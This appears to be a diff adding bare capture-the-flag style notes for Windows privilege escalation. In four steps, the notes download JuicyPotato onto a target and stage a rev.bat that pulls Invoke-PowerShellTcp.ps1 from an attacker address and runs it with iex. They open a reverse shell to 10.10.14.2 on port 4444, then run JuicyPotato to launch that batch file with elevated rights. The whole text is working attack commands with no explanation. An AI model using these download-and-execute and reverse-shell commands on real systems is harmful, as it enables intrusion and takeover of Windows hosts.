@@ -1,0 +1,11 @@
+Step 1: wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+Step 2: powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.2/JuicyPotato.exe', 'C:\Users\merlin\appdata\local\Temp\JuicyPotato.exe')"
+Step 3: (new-object net.webclient).downloadfile('http://10.10.14.2/rev.bat', 'C:\users\merlin\appdata\local\temp\rev.bat')
+
+```rev.bat
+powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/Invoke-PowerShellTcp.ps1')
+```
+```wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+copy and paste end of last line: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444
+```
+Step 4: .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c C:\Users\merlin\appdata\local\Temp\rev.bat" -t *
